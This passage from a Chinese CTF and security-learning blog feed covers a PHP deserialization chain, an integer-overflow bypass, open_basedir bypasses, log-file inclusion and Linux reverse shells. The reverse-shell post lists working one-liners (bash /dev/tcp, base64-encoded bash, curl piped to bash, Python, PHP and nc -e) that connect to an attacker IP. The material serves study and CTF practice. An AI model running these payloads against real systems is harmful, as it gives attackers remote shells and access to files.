class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;[<span class="keyword">new</span> one, <span class="string">&quot;MeMeMe&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了在<code>third::__get()</code>里调用<code>one::MeMeMe()</code>，同样使用数组进行调用。</p><p>至于为什么可以用数组的写法调用类中方法，这就涉及到php的设计底层了，只有先挖个坑的说。</p><p>这样得到输出</p><p><code>a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:6:&quot;second&quot;:1:&#123;s:8:&quot;filename&quot;;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:5:&quot;third&quot;:1:&#123;s:6:&quot;string&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;N;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:1;s:6:&quot;MeMeMe&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:1;N;&#125;</code></p><p>最后修改输出得到</p><p><code>a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:6:&quot;second&quot;:1:&#123;s:8:&quot;filename&quot;;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:5:&quot;third&quot;:1:&#123;s:6:&quot;string&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;N;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:1;s:6:&quot;MeMeMe&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:0;N;&#125;</code>。</p><p><img src="/images/BUU/202203011928514.png"></p><h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy web"></a>easy web</h1><p>F12找到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\$flag_filename = &#x27;flag&#x27;.md5(???).&#x27;php&#x27;;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$count</span>[++<span class="variable">$c</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$count</span>[] = <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable">$count</span>[++<span class="variable">$c</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$count</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$count</span>[++<span class="variable">$c</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[] = <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得想个办法把它给扬喽（指绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>[<span class="number">2</span>] = <span class="string">&#x27;ohh&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>[] = <span class="string">&#x27;yee&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>); <span class="comment"># Array( [2] =&gt; ohh [3] =&gt; yee )</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>] = <span class="string">&#x27;?!&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="string">&#x27;23333&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>[] = <span class="string">&#x27;qwq&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span>); <span class="comment"># Array( [0] =&gt; ?! [a] =&gt; 23333 [1] =&gt; qwq )</span></span><br></pre></td></tr></table></figure><p>关注上面demo的数组键值变化，不难发现其中玄妙。</p><p>直接向数组赋值时，它会自动获得一个递增的整数键名。</p><p>再回到题目中，对于数组无法赋值的情况当然就是整数溢出。</p><p>官方文档对此有相关说明</p><blockquote><p> 如果给定的一个数超出了 int 的范围，将会被解释为 float。同样如果执行的运算结果超出了 int 范围，也会返回 float。</p><p>示例 #2 32 位系统下的整数溢出<br>&lt;?php<br>$large_number = 2147483647;<br>var_dump($large_number);                     // int(2147483647)</p><p>$large_number = 2147483648;<br>var_dump($large_number);                     // float(2147483648)</p><p>$million = 1000000;<br>$large_number =  50000 * $million;<br>var_dump($large_number);                     // float(50000000000)<br>?&gt;</p><p>示例 #3 64 位系统下的整数溢出<br>&lt;?php<br>$large_number = 9223372036854775807;<br>var_dump($large_number);                     // int(9223372036854775807)</p><p>$large_number = 9223372036854775808;<br>var_dump($large_number);                     // float(9.2233720368548E+18)</p><p>$million = 1000000;<br>$large_number =  50000000000000 * $million;<br>var_dump($large_number);                     // float(5.0E+19)<br>?&gt;</p></blockquote><p>在这道题的64位系统环境下，只需要令<code>$c=9223372036854775806</code>再自增一次溢出就可以了。</p><p><img src="/images/BUU/20220331221320.png"></p><p>好了，现在我们已经跨过这层考验，下一步能干什么呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>能<code>new</code>一个对象 这里貌似没有自己写的<code>class</code> 那<code>new</code>的就是php的原生类了</p><p>其中<code>DirectoryIterator</code>类提供了遍历文件的简单接口。配合强大的正则表达式，就能读取到我们想要的文件。</p><p><code>a=DirectoryIterator&amp;b=glob://flag[a-z0-9]*.php</code></p><p><img src="/images/BUU/20220331223236.png"></p><p>这次学到好多的说！好耶！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;从这两道题学到了好多新知识的说&lt;/p&gt;
&lt;p&gt;第一次做没做出来&lt;del&gt;（真的太逊了）&lt;/del&gt;，在粟酱的博客指导下终于有了新的收获，太棒了&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>关于linux重定向和反弹shell</title>
    <link href="https://www.m0x01sery.com/2022/02/20/redirect-and-bash-rebound/"/>
    <id>https://www.m0x01sery.com/2022/02/20/redirect-and-bash-rebound/</id>
    <published>2022-02-19T16:00:00.000Z</published>
    <updated>2022-08-31T10:23:40.370Z</updated>
    
    <content type="html"><![CDATA[<p>先粗略地感受一手什么是linux的重定向功能</p><p>新建写有内容的文件<code>from.txt</code>和空文件<code>to.txt</code>，执行下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# cat &lt; from.txt &gt; to.txt</span><br><span class="line">root@localhost:~# cat to.txt</span><br></pre></td></tr></table></figure><p>发现<code>from.txt</code>文件里的内容被写入了<code>to.txt</code>。</p><p>要理解这种神奇的玩法，就要从linux的文件描述符开始讲起啦。</p><span id="more"></span><blockquote><p>stdin：标准输入文件，其文件描述符为0，默认由此读取数据</p><p>stdout：标准输出文件，其文件描述符为1，默认向它输出数据</p><p>stderr：标准错误文件，其文件描述符为2，默认向它写入错误信息</p><p>当一个命令执行时，通常从“标准输入”读取输入，在默认情况下，该“标准输入”为我们的键盘。当一个命令将其输出写入到“标准输出”中时，在默认情况下，该“标准输出”是我们的显示器。</p><p>对于某些后台运行的程序，输入可能来自于外部的一些文件，运算的结果通常又写到其他的文件中。而且程序在运行的过程中，会有一些关键性的信息，比如异常堆栈，外部接口调用情况等，这些都会统统写到日志文件里。</p><p>如果某些情况下，我们需要将shell命令的执行结果存储到文件中，那么我们就需要使用输入输出的重定向功能。</p></blockquote><p>我们完全可以从字面意思上理解：</p><p>输入重定向：指的是重新指定设备来代替键盘作为新的输入设备</p><p>输出重定向：指的是重新指定设备来代替显示器作为新的输出设备。</p><p>通常是用文件或命令的执行结果来代替键盘作为新的输入设备。</p><p>linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令。</p><p>linux的一切皆文件的思想在这里也有体现叭。</p><p>在重定向的思想指导下，就诞生了今天的主角——反弹shell。</p><p>最经典的bash反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# bash -i &gt;&amp; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>bash -i</code>：新建一个bash交互终端环境</p><p><code>&gt;&amp; /dev/tcp/233.33.3.333/2333</code>：这条命令用到了重定向绑定，等价于<code>1&gt; /dev/tcp/233.33.3.333/2333 2&gt;&amp;1</code>。意思就是让目标主机与攻击机<code>233.33.3.333</code>的<code>2333</code>端口建立一个tcp连接，并将本机的两个输出都绑定在攻击机的输出设备上（有点取地址符的意思）。这样被攻击的一方将看不见攻击方远程输入的命令，取而代之的现象是攻击机的屏幕上输出命令执行的结果前，会再次输出刚刚输入的命令。</p><p><code>0&gt;&amp;1</code>：同理，把标准输入也弹过来。</p><p>在控制变量<del>（乱改参数）</del>探索时遇到了个小疑惑：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# bash -i &gt; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>选择不将错误输出弹过来时，被攻击机（右）上仍会显示攻击方输入的命令。</p><p><img src="/images/BUU/202202222351390.png"></p><p>讲道理负责报错的来凑标准输出什么活（误</p><p>理想情况应该是这个亚子</p><p><img src="/images/BUU/202202222359286.png"></p><p>只能说学得太少，看到的种种都成了魔法（悲</p><p>挖个坑先</p><p>攻击机nc监听对应端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# nc -lvp 2333</span><br></pre></td></tr></table></figure><p><code>-l</code>：开启监听模式而不是主动连接</p><p><code>-v</code>：显示命令执行过程</p><p><code>-p</code>：指定端口</p><p>这样就能满足大部分场景需求了。</p><p>而反弹shell的难点在于，人家显然不会乖乖让我们把这种常见的危险命令直接跑进命令行里（指空格 关键字都被康了</p><p>你太baby辣！（指拒绝乖乖♂站好输命令）看我不把你李宁踹开线（指利用其它环境或编码</p><h1 id="冷油开锅"><a href="#冷油开锅" class="headerlink" title="冷油开锅"></a>冷油开锅</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMzMuMzMuMy4zMzMvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; # base64编码绕过空格</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 233.33.3.333/bash.html|bash # 把bash命令写入本地html文件即可</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;233.33.3.333&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; # 要求目标机有python环境</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;233.33.3.333&quot;, 2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; # 要求目标机有php交互式环境</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 233.33.3.333 2333 # 要求存在特定版本nc 存在-e 选项就能直接反弹shell</span><br></pre></td></tr></table></figure><p>等等等等（摸摸摸摸</p><p>还有很多其它可行的姿势，看了其它师傅们的总结才能对比出我的思维有多么单调，要学的还有很多呢</p><p><a href="https://xz.aliyun.com/t/2549#toc-5">反弹shell的本质</a></p><p><a href="https://whoamianony.top/2021/01/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%8F%8D%E5%BC%B9Shell%EF%BC%8C%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/">反弹Shell，看这一篇就够了</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;先粗略地感受一手什么是linux的重定向功能&lt;/p&gt;
&lt;p&gt;新建写有内容的文件&lt;code&gt;from.txt&lt;/code&gt;和空文件&lt;code&gt;to.txt&lt;/code&gt;，执行下面的命令&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@localhost:~# cat &amp;lt; from.txt &amp;gt; to.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root@localhost:~# cat to.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;发现&lt;code&gt;from.txt&lt;/code&gt;文件里的内容被写入了&lt;code&gt;to.txt&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;要理解这种神奇的玩法，就要从linux的文件描述符开始讲起啦。&lt;/p&gt;</summary>
    
    
    
    
    <category term="linux" scheme="https://www.m0x01sery.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>关于phpinfo页面</title>
    <link href="https://www.m0x01sery.com/2021/12/25/phpinfo/"/>
    <id>https://www.m0x01sery.com/2021/12/25/phpinfo/</id>
    <published>2021-12-24T16:00:00.000Z</published>
    <updated>2021-12-25T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>一说到phpinfo页面，之前对它的印象总是停留在 仅仅是一个测试是否getshell的标志 而已。但后来看到它的次数多了之后，逐渐意识到其实不应该忽略它所承载的各种配置详情。有时候是某个服务的开启与关闭，有时候是用户允许访问的文件范围，有时候是日志的绝对路径……周大福有时也会直接给出phpinfo页面，明摆着要我们从这些眼花缭乱的配置信息中找到突破。总之，学会看phpinfo百利而无一害，一定是值得花写这篇笔记的时间的呢。</p><p>这篇笔记将不定时更新</p><p><del>不更新才怪了 这才学多少哦 拉得一匹还好意思咕是吧</del></p><span id="more"></span><h1 id="厨具整理"><a href="#厨具整理" class="headerlink" title="厨具整理"></a>厨具整理</h1><h2 id="敏感配置"><a href="#敏感配置" class="headerlink" title="敏感配置"></a>敏感配置</h2><h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><p>php.ini配置文件里的禁用函数列表。</p><p>连上shell发现无法使用<code>system()</code>等函数执行命令时可以来这看看情况再决定下一步。</p><p>蚁剑有个绕过<strong>disable_functions</strong>的<a href="https://blog.csdn.net/zlzg007/article/details/108462813">插件，贼好用</a>的说</p><h3 id="allow-url-fopen-amp-allow-url-include"><a href="#allow-url-fopen-amp-allow-url-include" class="headerlink" title="allow_url_fopen &amp; allow_url_include"></a>allow_url_fopen &amp; allow_url_include</h3><p><strong>allow_url_fopen</strong>没什么好说的。默认开启，允许将url作为文件处理。</p><p>主要是<strong>allow_url_include</strong>，远程文件包含漏洞的灵魂</p><p>从php5.2开始<strong>allow_url_include</strong>默认是关闭的，这两个配置同时On后将允许<code>include/require</code>包含url文件，十分危险。</p><p><img src="/images/BUU/202112261743295.png"></p><p><strong>allow_url_include</strong>开启而<strong>allow_url_fopen</strong>关闭的情况下，仍然可利用<code>php://input</code>伪协议打穿文件包含漏洞。</p><p><img src="/images/BUU/202112261753114.png"></p><p>总之对<strong>allow_url_include</strong>保持敏感。</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><blockquote><p><strong>open_basedir</strong>可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径，也可用符号”.”来代表当前目录。</p><p>注意用open_basedir<strong>指定的限制实际上是路径前面的部分</strong>，而不是目录名。</p><p>举例来说：若”open_basedir=/dir/user”，那么目录”/dir/user”和”/dir/user233”都是可以访问的。</p><p>当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。</p><p>所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。例如设置成:”open_basedir = /dir/user/“</p><p>使用open_basedir可以限制程序可操作的目录和文件，提高系统安全性。但会影响I/O性能导致系统执行变慢，因此需要根据具体需求，在安全与性能上做平衡。</p></blockquote><p><img src="/images/BUU/202112261904065.png"></p><p><strong>来嘛，绕嘛</strong></p><p><strong>1.命令执行函数绕过</strong></p><p><strong>open_basedir</strong>的设置对<code>system</code>等命令执行函数是无效的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf ../target.php&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ../target.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2.<code>symlink()</code></strong></p><blockquote><p><code>symlink()</code>函数创建一个从指定名称连接的现存目标文件开始的符号连接。如果成功，该函数返回TRUE。如果失败，则返回FALSE。</p><p>该函数不能在Windows平台上执行。</p></blockquote><p>使用例</p><p>设置<strong>open_basedir</strong>为<code>/var/www/html/</code>。</p><p>尝试读取<code>/var/www/</code>下面的<code>target.txt</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;door&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;door&quot;</span>,<span class="string">&quot;tmp&quot;</span>);<span class="comment">//建立一个符号连接指向door，door是刚刚建立的目录文件</span></span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;tmp/../../target.txt&quot;</span>,<span class="string">&quot;gogogo&quot;</span>);<span class="comment">//这个时候tmp是符号链接文件，它指向的路径是door，因此这个时候gogogo指向的路径是：door/../../target.txt，door是在html目录下新建的目录，符合open_basedir的范围要求，所以建立成立</span></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;tmp&quot;</span>);<span class="comment">//删除符号链接</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;tmp&quot;</span>);<span class="comment">//新建tmp目录，导致gogogo指向的路径变成了tmp/../../，在tmp所在目录(也就是html目录)向上跳了一个目录</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://127.0.0.1/gogogo&quot;</span>);<span class="comment">//这个地方调用了链接gogogo，读取到了上一级目录下的target.txt</span></span><br></pre></td></tr></table></figure><p>要说防御手段也很简单粗暴，在最开始提到的<strong>disable_functions</strong>里把相关函数如<code>mkdir()</code> <code>chdir()</code> <code>symlink()</code>等相关函数禁掉就可以了。</p><p><strong>3.DirectoryIterator + glob伪协议</strong></p><p>上一篇博客 <a href="https://m1serry.github.io/2021/12/21/%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">关于php伪协议</a> 中已有粗略的相关说明。</p><p>这一篇再提到它是为了加深<strong>它能无视open_basedir限制遍历目录</strong>的印象，当然也就包括人见人爱的根目录。</p><blockquote><p>如ctfshow web72:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有open_basedir的限制</p><p><img src="/images/BUU/202112262215346.png"></p><p>可以用上面的方式绕过</p><p><img src="/images/BUU/202112262216878.png"></p></blockquote><h2 id="日志路径"><a href="#日志路径" class="headerlink" title="日志路径"></a>日志路径</h2><p>当我们没有上传点 也没有<strong>url_allow_include</strong>设置On，但存在文件包含漏洞时，我们就可以考虑包含服务器的日志文件。</p><p>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为。当我们的请求内容中包含php一句话木马时，也会被记录到日志中。</p><p>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实包含日志文件漏洞最关键的点就是找到日志存放的绝对路径，只要找到了日志的绝对存放路径，基本就只剩一把梭哈了。</p><p>phpinfo将泄露其绝对路径（如apache的<strong>APACHE_LOG_DIR</strong>配置项。</p><p>一般分为<strong>访问日志(Access Logs)</strong> 和 <strong>错误日志(Error Logs)</strong> 两种</p><p>这里以访问日志包含进行本地演示。</p><p>访问日志默认关闭，需在<strong>httpd-conf</strong>中手动开启</p><p>什么？你问我为什么不拿错误日志演示？</p><p><strong>经过了十分钟的反复对比实验，十分主观地得到了一个十分粗糙的结论：</strong></p><p>错误日志在写入记录时会进行HTML实体转义导致<code>&lt;</code> <code>&gt;</code> 这类符号变成<code>&amp;lt;</code> <code>&amp;gt;</code>实体，抓包修改URL转义后同样无法绕过，导致php代码的开始和结束标志<code>&lt;?php</code>无法被解析到，也就不存在什么命令注入的机会了</p><p><img src="/images/BUU/202112271754238.png"></p><p>访问日志在写入记录时只进行了URL转义使得<code>&lt;</code> <code>&gt;</code> 变成<code>%3C</code> <code>%3E</code>，但与HTML转义不同的是，这是能通过抓包修改回来的说</p><p>抓包修改前</p><p><img src="/images/BUU/202112271917442.png"></p><p>抓包修改后</p><p><img src="/images/BUU/202112271915507.png"></p><p>再对其绝对路径进行一个<code>include()</code></p><p><img src="/images/BUU/202112271920067.png"></p><p>爽到</p><p>关于为什么两个日志文件要转义以及为什么转义方式有所不同，暂时还没在精神网路<del>（什么Cytus）</del>上找到关联度比较高的讲解。</p><p>上述结论完全基于个人对比发现，多少会有不清不楚的地方，希望自己能早日弄明白</p><p>也许该学会英文搜索了呢</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一说到phpinfo页面，之前对它的印象总是停留在 仅仅是一个测试是否getshell的标志 而已。但后来看到它的次数多了之后，逐渐意识到其实不应该忽略它所承载的各种配置详情。有时候是某个服务的开启与关闭，有时候是用户允许访问的文件范围，有时候是日志的绝对路径……周大福有时也会直接给出phpinfo页面，明摆着要我们从这些眼花缭乱的配置信息中找到突破。总之，学会看phpinfo百利而无一害，一定是值得花写这篇笔记的时间的呢。&lt;/p&gt;
&lt;p&gt;这篇笔记将不定时更新&lt;/p&gt;
&lt;p&gt;&lt;del&gt;不更新才怪了 这才学多少哦 拉得一匹还好意思咕是吧&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="log" scheme="https://www.m0x01sery.com/tags/log/"/>
    
  </entry>
  
  <entry>
    <title>关于php伪协议</title>
    <link href="https://www.m0x01sery.com/2021/12/21/php-pseudo-protocol/"/>
    <id>https://www.m0x01sery.com/2021/12/21/php-pseudo-protocol/</id>
    <published>2021-12-20T16:00:00.000Z</published>
    <updated>2021-12-24T16:00:00.000Z</updated>
    
